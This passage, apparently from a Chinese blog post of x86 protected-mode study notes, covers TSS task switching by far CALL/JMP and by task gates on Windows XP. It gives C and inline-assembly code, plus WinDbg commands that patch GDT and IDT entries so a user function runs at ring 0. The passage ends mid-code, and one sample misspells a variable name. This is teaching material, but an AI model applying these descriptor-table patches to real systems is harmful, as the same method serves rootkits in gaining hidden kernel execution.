<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		push fs</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">		pop fs</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在XP中执行上述代码。</p>
</li>
<li><p>此时根据提示在Windbg中修改GDT表的段描述符：</p>
<p><code>eq 8003f048 0000e93a·00000068</code></p>
<p><code>!process 0 0;g</code>获取CR3的值</p>
</li>
<li><p>根据CR3的值回到XP中输入并回车，此时将会在Windbg中断在int 3，输入g执行返回，如果使用p单步将无法正常返回。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/Dl5oFmrBJ9OTk7p.png" alt="80.png"></p>
</li>
<li><p>使用int 3断下来后单步调试时观察堆栈和寄存器。</p>
<ol>
<li><p>在XP中执行CALL FAR前下断点观察寄存器。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/HuKtv4WOYDpjV9S.png" alt="81.png"></p>
</li>
<li><p>观察此时的TSS情况。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/dOR5ILA8T3epFhU.png" alt="82.png"></p>
</li>
<li><p>在XP中取消断点后F5执行，此时Windbg中查看0堆栈情况。堆栈中即为函数压入栈的8个通用寄存器、EFLAG寄存器、FS段寄存器。观察寄存器值也都成功替换。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/BvuEY8s3PUI6d2j.png" alt="83.png"></p>
</li>
<li><p>此时观察TSS中的数值。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/h8KYrMCgleUoOEt.png" alt="84.png"></p>
</li>
<li><p>根据段选择子0x0028找到对应的段描述符80008b04&#96;200020ab为任务切换的TSS段描述符，纪录的TSS段起始地址为：80042000，如下图即为上一个TSS段内存的数据。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/4XDRobaiBlAszr1.png" alt="85.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="3-5-练习：使用JMP调用任务段修改所有寄存器"><a href="#3-5-练习：使用JMP调用任务段修改所有寄存器" class="headerlink" title="3.5 练习：使用JMP调用任务段修改所有寄存器"></a>3.5 练习：使用JMP调用任务段修改所有寄存器</h3><p><strong>JMP FAR</strong>：  NT位置0，不会修改TSS previous task link（PTL）。</p>
<p>分别使用两种方式返回：</p>
<ul>
<li><p>JMP：既然是JMP触发执行的任务段，那也可以在裸函数中使用JMP跳到之前的TR保存的任务段进行返回。</p>
</li>
<li><p>iretd：由于JMP FAR任务段不会保存PTL，且NT位置0，则需要在裸函数中将前一个TR的选择子填充到TSS的前2字节和NT置1。（但是在真正测试时<strong>即使在iretd前修改NT位为1，当执行到EIP&#x3D;iretd时CPU还是会将NT位置为0，无法正确返回。</strong>）</p>
</li>
</ul>
<ol>
<li><p>准备TSS。</p>
</li>
<li><p>准备TSS段描述符并写入GDT表P&#x3D;0的位置，XX00E9XX &#96;XXXX0068，X为申请的104字节内存的首地址。</p>
</li>
<li><p>完整代码如下。需要获取任务切换前的TR寄存器的段选择子，方便裸函数跳转返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line">BYTE PrevTR[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//保存任务切换前的TR段选择子</span></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		push fs</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">		pop fs</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		jmp fword ptr ds:[PrevTr]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		str ax</span><br><span class="line">		lea edi,[PrevTR+<span class="number">4</span>]<span class="comment">//JMP后面的6个字节，低4字节为EIP，高2字节为段选择子</span></span><br><span class="line">		mov [edi],ax</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		jmp fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>VC6中运行后到Windbg中写对应的GDT表TSS段描述符，并获取CR3的值。</p>
<ul>
<li>eq 8003f048 0000e93a&#96;00000068</li>
<li><code>!process 0 0;g</code></li>
</ul>
</li>
<li><p>回到XP的VC6中输入CR3值后回车，此时断在裸函数的int 3，观察寄存器和堆栈。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/RDukEgJed1Kn8Sb.png" alt="86.png"></p>
</li>
<li><p>观察TSS段。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/JlnWcM9hX5j7Vsm.png" alt="87.png"></p>
<ul>
<li>此时的PTL&#x3D;0x00，说明JMP AFR任务段确实没有修改TSS中的PTL。</li>
<li>对应的段寄存器的值已经修改成功。</li>
</ul>
</li>
<li><p>此时Windbg中输入<code>g</code>运行后成功返回，如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/23/XD7qS2vJ3G4R8Ve.png" alt="88.png"></p>
</li>
</ol>
<p>在另外的测试中，使用iretd返回时，即使NT置1，并修改TSS的PTL，当执行到<code>eip=iretd</code>指令时，EFLAG又回自动将NT位置0，所以无法使用iretd进行返回，或者可以尝试使用中断返回试试（使用堆栈）。</p>
<div class="note warning"><p><strong>结论：</strong>3环CALL<strong>任务段选择子</strong> --&gt; GDT找到对应任务段描述符 --&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 --&gt; 根据TSS中的EIP去执行代码 --&gt; IRETD返回。</p>
<ol>
<li><strong>CALL任务段不会将返回地址压栈，因为使用TR的选择子跳过去。返回也不会使用到返回地址，而是使用PTL（前一个TR的段选择子）</strong>。</li>
<li>即使在iretd前修改NT位为1，当执行到EIP&#x3D;iretd时CPU还是会将NT位置为0，无法正确返回（<strong>有可能是因为要切回去的那个任务的TSS段描述符的B位为1，正在忙</strong>，处理器是通过TSS的B位来检测重入的。因中断，iret，call，jmp指令发起的任务切换时，处理器固件会检测新任务的TSS的B位，如果该位为1，则处理器不允许这样的任务切换）。</li>
<li><strong>无论何时，只要处理器碰到iret指令，它都会检查NT位。</strong></li>
</ol>
</div>

<p>具体详细的可以参考它的笔记<a href="https://lyy-0217.blog.csdn.net/article/details/85071085">二十六、二十七</a>。</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37375427/article/details/85046543">【OS学习笔记】二十六 保护模式八：任务门—任务切换</a></li>
<li><a href="https://blog.csdn.net/qq_37375427/article/details/85051515">【OS学习笔记】二十七 保护模式八：任务切换的方法之—-jmp与call的区别以及任务的中断嵌套</a></li>
</ul>
<h2 id="4-任务门"><a href="#4-任务门" class="headerlink" title="4 任务门"></a>4 任务门</h2><p>Windows、Linux都没有使用CPU提供的通过TSS来切换线程，而是使用堆栈。那操作系统用TSS来做什么？</p>
<p>既然已经有了任务段为什么还要有任务门？</p>
<div class="note primary"><p>任务门存在的意义其一 <strong>int 8双重错误</strong>举例：</p>
<p>假设一个除以0错误，首先会触发int 0中断去查IDT表中对应的地址去执行，如果在执行过程中如果再次出错时就会触发int 8。</p>
<p>int 8是如何接管处理的呢？一旦进入8号中断，将会替换一堆寄存器，保证CPU 能跳到一个正确的地方去执行（除非那个地方也被破坏了），此时什么错误都无所谓了，收集信息后，蓝屏。</p>
</div>

<p>任务门int 8查的IDT表即为任务门：</p>
<p>IDT–00008500&#96;<strong>0050</strong>1198–0050–0101 0 0 00–0xA–GDT第十一个</p>
<p>GDT–8000<strong>89</strong>55&#96;27000068–32位TSS任务段Base：80552700–dd 80552700–80544509–uf 80544509</p>
<p><strong>调用任务段的三种方法</strong>：<mark class="label danger">CALL/JMP FAR、任务门</mark>。</p>
<p>IDT表可以包含3种门描述符：</p>
<ul>
<li>任务门描述符</li>
<li>中断门描述符</li>
<li>陷阱门描述符</li>
</ul>
<p>任务门描述符：</p>
<p><img data-src="https://s2.loli.net/2021/12/24/YuOsoBST7XwyvdQ.png" alt="89.png"></p>
<p>TSS段描述符结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<p>任务门的执行过程：</p>
<ol>
<li>INT N指令来去IDT表中找对应的<strong>任务门描述符</strong></li>
<li>查询IDT表找到任务门描述符</li>
<li>通过任务门描述符表的TSS段选择子查询GDT表，找到<strong>任务段描述符</strong></li>
<li>根据TSS段描述符的Base找到TSS任务段内存块</li>
<li>使用TSS段中的值修改寄存器</li>
<li>IRETD返回</li>
</ol>
<p>执行流程图如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/24/QR3gGmZzhtoPdpI.png" alt="94.png"></p>
<h3 id="4-1-练习：使用任务门修改所有的寄存器的值"><a href="#4-1-练习：使用任务门修改所有的寄存器的值" class="headerlink" title="4.1 练习：使用任务门修改所有的寄存器的值"></a>4.1 练习：使用任务门修改所有的寄存器的值</h3><ol>
<li><p>构造任务门段描述符：0000<strong>E5</strong>00&#96;<strong>0048</strong>0000</p>
<ul>
<li>P&#x3D;1</li>
<li>DPL&#x3D;0x11&#x3D;3（能让3环的代码访问到这个门）</li>
<li>S&#x3D;0</li>
<li>0x1110&#x3D;0xE</li>
<li>任务门：0x0101&#x3D;0x5</li>
<li>TSS段选择子：0x0048（查GDT的第10项）0100 1 0 00</li>
</ul>
</li>
<li><p>修改IDT表。（找个P&#x3D;0的，如第33项）eq 8003f500 0000E500&#96;00480000</p>
<p><img data-src="https://s2.loli.net/2021/12/24/QfDWxua4F75YBUJ.png" alt="90.png"></p>
</li>
<li><p>代码如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line">DWORD *TSS = <span class="literal">NULL</span>;	 <span class="comment">//TSS内存块</span></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">		mov dword ptr ds:[dwOk],eax</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr ds:[dwESP],eax</span><br><span class="line">		mov ax,cs</span><br><span class="line">		mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">      </span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;	</span><br><span class="line">	DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line">	<span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">	TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制当前进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span 